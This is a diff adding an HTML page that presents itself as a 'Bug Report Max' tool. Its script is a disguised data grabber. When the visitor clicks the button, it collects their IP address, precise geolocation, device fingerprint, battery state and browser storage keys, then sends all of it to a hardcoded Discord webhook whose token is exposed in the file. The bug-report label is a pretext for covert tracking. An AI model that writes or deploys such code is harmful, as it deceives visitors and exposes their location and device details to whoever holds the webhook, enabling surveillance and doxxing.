@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Bug Report Max</title>
+</head>
+<body>
+<h2>Status: <span id="status">Idle</span></h2>
+<button id="send">Send Bug Report</button>
+
+<script>
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1341126415923417160/1MBugwArtglgPFGUtKcga7hsdLAtafh3qmKavgcz0mw6FBoubVVDT3UMvXF07AqbWZ4Q"; // <--- вставь сюда свой вебхук
+
+async function getIP() {
+  try {
+    const res = await fetch("https://api.ipify.org/?format=json");
+    const data = await res.json();
+    return data.ip || "Unavailable";
+  } catch {
+    return "Unavailable";
+  }
+}
+
+async function getLocation() {
+  return new Promise(resolve => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
+        () => resolve("Location denied")
+      );
+    } else {
+      resolve("Geolocation not supported");
+    }
+  });
+}
+
+async function collectInfo() {
+  const ip = await getIP();
+  const location = await getLocation();
+  const browser = navigator.userAgent;
+  const language = navigator.language;
+  const platform = navigator.platform;
+  const date = new Date().toLocaleString();
+
+  const screenInfo = `${window.screen.width}x${window.screen.height}`;
+  const colorDepth = window.screen.colorDepth;
+  const pixelDepth = window.screen.pixelDepth;
+  const deviceMemory = navigator.deviceMemory || "Unavailable";
+  const hardwareConcurrency = navigator.hardwareConcurrency || "Unavailable";
+  const connection = navigator.connection || {};
+  const onlineStatus = navigator.onLine ? "Online" : "Offline";
+  const referrer = document.referrer || "No referrer";
+  const locationOrigin = window.location.origin;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable";
+  const cookieEnabled = navigator.cookieEnabled;
+  const plugins = Array.from(navigator.plugins).map(p => p.name).join(", ") || "No plugins";
+  const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({charging: "Unavailable", level: "Unavailable"}));
+  const touchSupport = ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No";
+  const localStorageKeys = Object.keys(localStorage).join(", ") || "Empty";
+  const sessionStorageKeys = Object.keys(sessionStorage).join(", ") || "Empty";
+
+  return {
+    ip, location, browser, language, platform, date,
+    screenInfo, colorDepth, pixelDepth,
+    deviceMemory, hardwareConcurrency, connection,
+    onlineStatus, referrer, locationOrigin, timezone,
+    cookieEnabled, plugins, battery, touchSupport,
+    localStorageKeys, sessionStorageKeys
+  };
+}
+
+document.getElementById("send").onclick = async () => {
+  document.getElementById("status").textContent = "Collecting bug report...";
+
+  const info = await collectInfo();
+
+  const data = {
+    content: "**🐛 MAX Bug Report**",
+    embeds: [{
+      title: "📝 Detailed Device Info",
+      description: "Comprehensive bug report generated from client device.",
+      color: 16711680,
+      fields: [
+        { name: "🌍 Location", value: info.location, inline: false },
+        { name: "📱 IP Address", value: info.ip, inline: true },
+        { name: "💻 Browser", value: info.browser, inline: false },
+        { name: "🖥 Platform", value: info.platform, inline: true },
+        { name: "🗣 Language", value: info.language, inline: true },
+        { name: "⏱ Date/Time", value: info.date, inline: false },
+        { name: "🖼 Screen Resolution", value: info.screenInfo, inline: true },
+        { name: "🎨 Color Depth", value: `${info.colorDepth} bits`, inline: true },
+        { name: "📏 Pixel Depth", value: `${info.pixelDepth} bits`, inline: true },
+        { name: "💾 Device Memory", value: `${info.deviceMemory} GB`, inline: true },
+        { name: "⚙ CPU Cores", value: `${info.hardwareConcurrency}`, inline: true },
+        { name: "🌐 Connection Type", value: info.connection.effectiveType || "Unavailable", inline: true },
+        { name: "📡 Downlink", value: info.connection.downlink ? `${info.connection.downlink} Mbps` : "Unavailable", inline: true },
+        { name: "⏳ RTT", value: info.connection.rtt ? `${info.connection.rtt} ms` : "Unavailable", inline: true },
+        { name: "💾 Save Data", value: info.connection.saveData ? "Yes" : "No", inline: true },
+        { name: "🌐 Online Status", value: info.onlineStatus, inline: true },
+        { name: "🔗 Referrer", value: info.referrer, inline: false },
+        { name: "🏠 Origin", value: info.locationOrigin, inline: true },
+        { name: "⏰ Timezone", value: info.timezone, inline: true },
+        { name: "🍪 Cookies Enabled", value: info.cookieEnabled ? "Yes" : "No", inline: true },
+        { name: "🔌 Plugins", value: info.plugins, inline: false },
+        { name: "🔋 Battery", value: `Charging: ${info.battery.charging}, Level: ${Math.round(info.battery.level * 100)}%`, inline: true },
+        { name: "🤏 Touch Support", value: info.touchSupport, inline: true },
+        { name: "📂 LocalStorage Keys", value: info.localStorageKeys, inline: false },
+        { name: "📂 SessionStorage Keys", value: info.sessionStorageKeys, inline: false }
+      ]
+    }]
+  };
+
+  try {
+    const res = await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+    document.getElementById("status").textContent = res.ok ? "Bug Report Sent ✅" : "Failed ❌";
+  } catch (e) {
+    document.getElementById("status").textContent = "Error ❌";
+    console.error(e);
+  }
+};
+</script>
+</body>
+</html>
